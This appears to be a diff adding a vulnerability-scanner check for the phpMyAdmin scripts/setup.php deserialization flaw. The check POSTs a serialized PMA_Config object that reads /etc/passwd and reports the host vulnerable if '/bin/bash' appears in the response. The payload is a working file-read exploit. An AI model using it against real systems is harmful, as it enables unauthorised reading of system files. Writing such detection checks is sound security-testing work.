@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /scripts/setup.php
+#define bug =/bin/bash
+#define info = 存在Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433)
+#define post = action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
